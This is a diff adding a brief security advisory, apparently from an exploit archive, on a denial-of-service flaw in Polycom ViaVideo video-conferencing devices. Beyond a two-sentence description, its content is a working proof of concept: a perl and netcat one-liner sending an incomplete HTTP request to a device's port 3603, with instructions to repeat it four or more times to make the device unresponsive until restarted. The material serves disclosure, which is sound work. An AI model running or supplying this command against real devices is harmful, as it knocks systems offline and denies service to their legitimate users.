@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/5962/info
+
+Polycom ViaVideo devices are prone to a denial of service condition upon receipt of numerous incomplete HTTP requests. This may restrict availability of the device for legitimate users.
+
+The device may need to be restarted to regain normal functionality. 
+
+perl -e 'print "GET " . "/" . " HTTP/1.1\r\n"' | netcat 10.1.3.54 3603 &
+
+Issue the above command four or more times to cause the denial of service condition. 
